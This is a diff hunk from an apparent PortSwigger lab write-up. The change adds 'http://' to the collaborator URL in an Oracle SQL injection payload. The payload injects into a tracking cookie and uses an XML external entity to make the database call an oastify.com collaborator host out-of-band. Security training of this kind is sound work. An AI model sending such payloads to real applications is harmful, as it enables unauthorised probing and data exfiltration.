@@ -43,7 +43,7 @@ SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT
 Then query will be changed by pasting the external  domain provided by collaborator would look like this
 
 ```sql
-SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "hsdsl3chnluavy0asy6vodz1ys4js9gy.oastify.com/"> %remote;]>'),'/l') FROM dual)--
+SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://hsdsl3chnluavy0asy6vodz1ys4js9gy.oastify.com/"> %remote;]>'),'/l') FROM dual)--
 ```
 
 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c71e3347-c20a-4269-8930-999d6ca7b6d9)
